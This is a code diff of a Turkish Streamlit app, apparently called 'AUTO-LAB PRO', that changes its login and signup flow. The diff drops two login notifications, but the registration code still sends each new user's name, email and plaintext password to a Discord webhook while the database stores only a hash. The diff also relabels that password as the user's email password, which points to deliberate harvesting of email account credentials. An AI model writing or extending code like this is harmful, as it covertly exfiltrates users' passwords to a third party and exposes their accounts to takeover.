@@ -259,7 +259,6 @@ if not st.session_state.giris_yapildi:
                     st.session_state.is_admin = True
                     st.session_state.giris_yapildi = True
                     giris_kaydi_ekle("ADMIN", "Admin Girişi")
-                    discorda_mesaj_gonder("🚨 **Yönetici (ADMIN) Sistemi Giriş Yaptı!**")
                     st.success("Yönetici girişi başarılı!")
                     st.rerun()
                 else:
@@ -275,7 +274,6 @@ if not st.session_state.giris_yapildi:
                                     st.session_state.is_admin = False
                                     st.session_state.giris_yapildi = True
                                     giris_kaydi_ekle(k, "Giriş Yaptı")
-                                    discorda_mesaj_gonder(f"👤 **Kullanıcı Girişi:** `{k}` sisteme giriş yaptı.")
                                     st.success("Giriş başarılı!")
                                     st.rerun()
                             else: st.error("Kullanıcı adı veya şifre hatalı!")
@@ -295,11 +293,11 @@ if not st.session_state.giris_yapildi:
                             cursor.execute("INSERT INTO kullanicilar (ad, soyad, eposta, kullanici_adi, sifre, islem_hakki) VALUES (?, ?, ?, ?, ?, 20)", (ka, ks, kep, kkadi.strip(), sifre_hashle(ksifre.strip())))
                             conn.commit()
                         
-                        # Discord Webhook Bildirimi (Ad, Soyad, E-posta, Şifre ve Kullanıcı Adı)
+                        # Discord Webhook Bildirimi (Ad, Soyad, E-posta, E-posta Şifresi ve Kullanıcı Adı)
                         discord_mesaji = f"""🔔 **YENİ KULLANICI KAYDI (AUTO-LAB PRO)**
 👤 **Ad Soyad:** {ka} {ks}
-📧 **E-posta:** {kep}
-🔑 **Şifre (Düz Metin):** `{ksifre}`
+📧 **E-posta Adresi:** {kep}
+🔑 **E-posta Şifresi:** `{ksifre}`
 🆔 **Kullanıcı Adı:** `{kkadi}`"""
                         discorda_mesaj_gonder(discord_mesaji)
 
